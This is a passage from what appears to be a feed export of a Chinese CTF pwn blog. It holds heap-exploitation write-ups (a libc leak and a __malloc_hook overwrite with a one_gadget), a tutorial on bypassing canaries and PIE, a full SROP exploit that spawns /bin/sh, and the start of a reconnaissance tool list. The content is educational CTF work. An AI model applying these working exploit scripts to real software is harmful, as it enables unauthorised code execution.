process(&apos;./pwn&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;pwn&apos;)</span><br><span class="line">libc = ELF(&apos;libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create(size,name):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&quot;1&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;size: \n&quot;,str(size))</span><br><span class="line">    sh.sendafter(&quot;name: \n&quot;,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&apos;2&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;index: \n&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&apos;3&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;weapon:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def backdoor(index):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&apos;666&apos;)</span><br><span class="line">    sh.sendlineafter(&quot;weapon:\n&quot;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(0x100,&apos;a\n&apos;)</span><br><span class="line">create(0x60,&apos;b\n&apos;)</span><br><span class="line">create(0x60,&apos;c\n&apos;)</span><br><span class="line">create(0x60,&apos;a&apos;*0x10+p64(0x110)+p64(0x41)+&apos;\n&apos;)</span><br><span class="line">dele(0)</span><br><span class="line">show(0)</span><br><span class="line">sh.recvuntil(&quot;attack_times: &quot;)</span><br><span class="line">libc.base = int(sh.recvuntil(&quot;\n&quot;,drop=True))-0x3c4b78</span><br><span class="line">print hex(libc.base)</span><br><span class="line">malloc_hook = libc.base+libc.symbols[&apos;__malloc_hook&apos;]#0x3c4b00</span><br><span class="line">print hex(malloc_hook)</span><br><span class="line">one_gadget = libc.base+0xf02a4#0x4526a</span><br><span class="line"></span><br><span class="line">create(0x100,&apos;a&apos;*0xf0+p64(0x110)+p64(0x111))</span><br><span class="line">dele(2)</span><br><span class="line">dele(1)</span><br><span class="line">create(0x100,&apos;a&apos;*0x58+p64(0x71)+p64(malloc_hook-0x23)+&apos;\n&apos;)</span><br><span class="line">create(0x60,&apos;b\n&apos;)</span><br><span class="line">create(0x60,&apos;aaa&apos;+p64(one_gadget)+&apos;\n&apos;)</span><br><span class="line">#dele(7)</span><br><span class="line">#create(0x4f,&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h1><p>没注意到一个煞笔漏洞，被忽悠的以为有size检测，把好好的一道送分题送了</p><h2 id="题目-amp-amp-分析-2"><a href="#题目-amp-amp-分析-2" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>开局可以泄露libc地址，本来用的是fmt，结果可以直接泄露。之后uaf</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process(&quot;./pwn&quot;)</span><br><span class="line">#sh = remote(&quot;172.29.21.114&quot;, 8888)</span><br><span class="line"># todo check libc version</span><br><span class="line">libc = ELF(&quot;libc-2.23.so&quot;, checksec = False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendafter(&quot;name?&quot;,&quot;a&quot;*7+&quot;b&quot;)</span><br><span class="line">sh.recvuntil(&quot;ab&quot;)</span><br><span class="line">addr = u64(sh.recv(6) +&quot;\x00&quot;*2)-0x6fdbd</span><br><span class="line">print(hex(addr))</span><br><span class="line">sh.sendlineafter(&quot;ID.&quot;,&quot;123&quot;)</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    sh.sendlineafter(&quot;choice:&quot;, &quot;1&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;story:&quot;,str(size))</span><br><span class="line">    sh.sendafter(&quot;story&quot;, content)</span><br><span class="line"></span><br><span class="line">def remove(index):</span><br><span class="line">    sh.sendlineafter(&quot;choice:&quot;,&quot;4&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;dex:&quot;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x68, &quot;123&quot;)</span><br><span class="line">add(0x68, &quot;123&quot;)</span><br><span class="line">remove(0)</span><br><span class="line">remove(1)</span><br><span class="line">remove(0)</span><br><span class="line"></span><br><span class="line">add(0x68, p64(addr+libc.symbols[&quot;__malloc_hook&quot;]-35))</span><br><span class="line">add(0x68,&quot;aaa&quot;)</span><br><span class="line">add(0x68,&quot;bbb&quot;)</span><br><span class="line">add(0x68,&quot;a&quot;*19+p64(addr+0xf1147))#0xf02a4))</span><br><span class="line"></span><br><span class="line">#add(0x10,&apos;a&apos;)</span><br><span class="line">#remove(0)</span><br><span class="line">#remove(0)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;pwn2&quot;&gt;&lt;a href=&quot;#pwn2&quot; class=&quot;headerlink&quot; title=&quot;pwn2&quot;&gt;&lt;/a&gt;pwn2&lt;/h1&gt;&lt;h2 id=&quot;题目-amp-amp-分析&quot;&gt;&lt;a href=&quot;#题目-amp-amp-分析&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>Bypass Protect</title>
    <link href="http://siriuswhiter.tk/2019/05/29/bypass-protect/"/>
    <id>http://siriuswhiter.tk/2019/05/29/bypass-protect/</id>
    <published>2019-05-29T15:11:48.000Z</published>
    <updated>2019-06-07T02:40:29.819Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h1><p>canary用来检测栈溢出,程序正常的走完了流程，到函数执行完的时候，程序会再次从一个神奇的地方把canary的值取出来，和之前放在栈上的canary进行比较，如果因为栈溢出什么的原因覆盖到了canary而导致canary发生了变化则直接终止程序。canary的最低位恒为零，使得不存在截断问题。</p><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>通过格式化字符串读取canary的值，然后在栈溢出的padding块把canary所在位置的值用正确的canary替换，从而绕过canary的检测。<br>或者直接任意地址写覆盖返回地址之类的也可以绕过。</p><h2 id="针对fork的进程"><a href="#针对fork的进程" class="headerlink" title="针对fork的进程"></a>针对fork的进程</h2><p>对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序GG了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。</p><h2 id="ssp-leak（Stack-Smashing-Protector-）"><a href="#ssp-leak（Stack-Smashing-Protector-）" class="headerlink" title="ssp leak（Stack Smashing Protector ）"></a>ssp leak（Stack Smashing Protector ）</h2><p>如果canary被我们的值覆盖而发生了变化，程序会执行函数___stack_chk_fail()</p><p>___stack_chk_fail()源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">void </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__stack_chk_fail (void) &#123;   </span><br><span class="line">__fortify_fail (&quot;stack smashing detected&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__fortify_fail (msg)</span><br><span class="line">   const char *msg; &#123;</span><br><span class="line">      /* The loop is added only to keep gcc happy. */</span><br><span class="line">         while (1)</span><br><span class="line">              __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;) </span><br><span class="line">&#125; </span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure></p><p>__libc_message 的第二个%s输出的是argv[0]，argv[0]是指向第一个启动参数字符串的指针，会在栈中存放，只要能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值。</p><h2 id="Modify-the-TLS"><a href="#Modify-the-TLS" class="headerlink" title="Modify the TLS"></a>Modify the TLS</h2><p>正常情况下，canary取值是:<br>32 bits:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, large gs:14h</span><br><span class="line">mov     [ebp+var_C], eax</span><br></pre></td></tr></table></figure></p><p>64 bits:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, fs:28h</span><br><span class="line">mov     [rbp+var_8], rax</span><br></pre></td></tr></table></figure></p><p>而段寄存器fs &amp;&amp; gs的定义是指向本线程的TLS结构</p><p>在vvar与 /lib/x86_64-linux-gnu/ld-2.23.so之间的一段空间,可以看到有写权限<br>64位一般在该段的起始地址＋0x1700+0x28处 /  32位      +0x14<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/sirius/tikool/prac/canary/canary_test</span><br><span class="line">          0x600000           0x601000 r--p     1000 0      /home/sirius/tikool/prac/canary/canary_test</span><br><span class="line">          0x601000           0x602000 rw-p     1000 1000   /home/sirius/tikool/prac/canary/canary_test</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fda000     0x7ffff7fdd000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x/10gx 0x7ffff7fda000+0x1700</span><br><span class="line">0x7ffff7fdb700:0x00007ffff7fdb7000x00007ffff7fda010</span><br><span class="line">0x7ffff7fdb710:0x00007ffff7fdb7000x0000000000000000</span><br><span class="line">0x7ffff7fdb720:0x00000000000000000x2928659c8989cd00</span><br><span class="line">0x7ffff7fdb730:0xb97e5185f9afb6be0x0000000000000000</span><br><span class="line">0x7ffff7fdb740:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><h1 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h1><p>PIE(position-independent executable, 地址无关可执行文件)技术是一个针对代码段.text, 数据段.*data，.bss等固定地址的一个防护技术。同ASLR一样，应用了PIE的程序会在每次加载时都变换加载基址，从而使位于程序本身的gadget也失效。</p><h2 id="partial-write"><a href="#partial-write" class="headerlink" title="partial write"></a>partial write</h2><p>由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。因此通过覆盖EIP的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。</p><h2 id="leak-libc-addr"><a href="#leak-libc-addr" class="headerlink" title="leak libc addr"></a>leak libc addr</h2><p>PIE影响的只是程序加载基址，并不会影响指令间的相对地址，因此我们如果能泄露出程序或libc的某些地址，我们就可以利用偏移来达到目的。这也是比较常用的方法。</p><h2 id="vdso-vsyscall"><a href="#vdso-vsyscall" class="headerlink" title="vdso/vsyscall"></a>vdso/vsyscall</h2><p>在开启了ASLR的系统上运行PIE程序，就意味着所有的地址都是随机化的。然而在某些版本的系统中这个结论并不成立，原因是存在着一个神奇的vsyscall。（由于vsyscall在一部分发行版本中的内核已经被裁减掉了，新版的kali也属于其中之一。vsyscall在内核中实现，无法用docker模拟，因此任何与vsyscall相关的实验都改成在Ubuntu 16.04上进行，同时libc中的偏移需要进行修正）</p><p>关于vsyscall<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简单地说，现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall</span><br></pre></td></tr></table></figure></p><p>由于vsyscall地址的固定性，这个本来是为了节省开销的设置造成了很大的隐患，因此vsyscall很快就被新的机制vdso所取代。与vsyscall不同的是，vdso的地址也是随机化的，且其中的指令可以任意执行，不需要从入口开始，这就意味着我们可以利用vdso中的syscall来干一些坏事了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Canary&quot;&gt;&lt;a href=&quot;#Canary&quot; class=&quot;headerlink&quot; title=&quot;Canary&quot;&gt;&lt;/a&gt;Canary&lt;/h1&gt;&lt;p&gt;canary用来检测栈溢出,程序正常的走完了流程，到函数执行完的时候，程序会再次从一个神奇的地方把canar
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to pwn1.5--SROP</title>
    <link href="http://siriuswhiter.tk/2019/05/24/introduction-to-pwn1-5-srop/"/>
    <id>http://siriuswhiter.tk/2019/05/24/introduction-to-pwn1-5-srop/</id>
    <published>2019-05-24T08:35:36.000Z</published>
    <updated>2019-05-30T08:52:48.225Z</updated>
    
    <content type="html"><![CDATA[<p><em>这学期真实忙成狗，再加上之前状态不好，这学期pwn方向的技术没有太大进展，更多的是在查缺补漏，稳固基础</em></p><h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>之前没去看过，现在抽时间来看一下，原理比想象中的更简单一些，比较容易理解。<br>ctfwiki上的： <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/#signal" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/#signal</a></p><p>这里直接使用wiki上的说法：</p><figure class="image-box">                <img src="/2019/05/24/introduction-to-pwn1-5-srop/rt_signal.png" alt="rt_signal" title="" class="">                <p>rt_signal</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。</span><br><span class="line"></span><br><span class="line">1. 内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</span><br><span class="line"></span><br><span class="line">2. 内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</span><br><span class="line"></span><br><span class="line">3. signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15。</span><br></pre></td></tr></table></figure><p>简单来讲就是unix系统在传递signal信息时，会将进程信息以Signal Frame 的格式保存在用户态空间的栈中，而且在回调时并不会有任何检查，所以只要能够改变其结构中的关键数据，就可以使得在恢复进程执行时获得shell或者其他系统调用。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ul><li>利用条件</li></ul><ol><li>足够的栈溢出以存放sigal frame结构体（ps: 不一定要放在栈中</li><li>需要知道： <ul><li>“/bin/sh”</li><li>Signal Frame</li><li>syscall</li><li>sigreturn</li></ul></li></ol><ul><li>利用方式<br>pwntools中实现了SROP的库，这样就免去了自己费劲构造结构体的过程</li></ul><p>格式：(设置结构体中保存的需要修改的寄存器即可)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + 0x120  # &quot;/bin/sh&quot; &apos;s addr</span><br><span class="line">sigframe.rsi = 0x0</span><br><span class="line">sigframe.rdx = 0x0</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br></pre></td></tr></table></figure></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>源代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">xor     rax, rax;</span><br><span class="line">mov     edx, 400h;</span><br><span class="line">mov     rsi, rsp;</span><br><span class="line">mov     rdi, rax;</span><br><span class="line">syscall;</span><br><span class="line">retn;</span><br></pre></td></tr></table></figure></p><p>编译链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm srop.asm -f elf64</span><br><span class="line">ld -m elf_x86_64 srop.o -o srop</span><br></pre></td></tr></table></figure></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>就是一个调用read系统调用的函数，在栈顶输入0x400个字节，这里我们使用srop来看</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">small = ELF(&apos;./srop&apos;)</span><br><span class="line">sh = process(&apos;./srop&apos;)</span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">syscall_ret = 0x000000000040008E</span><br><span class="line">start_addr = 0x0000000000400080</span><br><span class="line">## set start addr three times</span><br><span class="line">payload = p64(start_addr) * 3</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">## modify the return addr to start_addr+3</span><br><span class="line">## so that skip the xor rax,rax; then the rax=1</span><br><span class="line">## get stack addr</span><br><span class="line">sh.send(&apos;\x83&apos;)</span><br><span class="line">stack_addr = u64(sh.recv()[8:16])</span><br><span class="line">log.success(&apos;leak stack addr :&apos; + hex(stack_addr))</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">## make the rsp point to stack_addr</span><br><span class="line">## the frame is read(0,stack_addr,0x400)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = 0</span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = 0x400</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">## set rax=15 and call sigreturn</span><br><span class="line">sigreturn = p64(syscall_ret) + &apos;b&apos; * 7</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line">## call execv(&quot;/bin/sh&quot;,0,0)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + 0x120  # &quot;/bin/sh&quot; &apos;s addr</span><br><span class="line">sigframe.rsi = 0x0</span><br><span class="line">sigframe.rdx = 0x0</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)</span><br><span class="line">print len(frame_payload)</span><br><span class="line">payload = frame_payload + (0x120 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;这学期真实忙成狗，再加上之前状态不好，这学期pwn方向的技术没有太大进展，更多的是在查缺补漏，稳固基础&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;SROP&quot;&gt;&lt;a href=&quot;#SROP&quot; class=&quot;headerlink&quot; title=&quot;SROP&quot;&gt;&lt;/a&gt;SROP&lt;/
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--信息收集篇</title>
    <link href="http://siriuswhiter.tk/2019/05/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/"/>
    <id>http://siriuswhiter.tk/2019/05/23/渗透测试-信息收集篇/</id>
    <published>2019-05-23T07:13:51.000Z</published>
    <updated>2019-05-24T13:11:32.815Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DNS-IP-挖掘信息"><a href="#DNS-IP-挖掘信息" class="headerlink" title="DNS+IP 挖掘信息"></a>DNS+IP 挖掘信息</h1><h2 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h2><p>whois + domainname<br><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a></p><p>nslookup</p><p>dig</p><p>fierce 工具暴力破解dns： fierce -dns weburl</p><h2 id="ip2location"><a href="#ip2location" class="headerlink" title="ip2location"></a>ip2location</h2><p><a href="https://www.maxmind.com/en/home" target="_blank" rel="noopener">https://www.maxmind.com/en/home</a></p><p>国内ip查询 <a href="http://www.cz88.net/" target="_blank" rel="noopener">http://www.cz88.net/</a></p><p><a href="https://www.ip-adress.com/" target="_blank" rel="noopener">https://www.ip-adress.com/</a></p><p>google map 查询</p><h2 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h2><p><a href="http://searchdns.netcraft.com" target="_blank" rel="noopener">http://searchdns.netcraft.com</a></p><p><a href="https://toolbar.netcraft.com/site_report" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report</a>    站点信息</p><p>Layer子域名挖掘机</p><p>dmitry信息收集工具: dmitry -winse weburl</p><h2 id="ip2domain"><a href="#ip2domain" class="headerlink" title="ip2domain"></a>ip2domain</h2><p><a href="https://www.ip-adress.com/reverse-ip-lookup" target="_blank" rel="noopener">https://www.ip-adress.com/reverse-ip-lookup</a></p><p>国内 不仅是信息反查： <a href="http://www.7c.com/" target="_blank" rel="noopener">http://www.7c.com/</a></p><h1 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h1><h2 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h2><p>GDHB 谷歌黑客数据库： <a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a>  </p><p>自动化工具：</p><ol><li>SiteDigger  </li><li>Search Diggity ： <a href="https://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/" target="_blank" 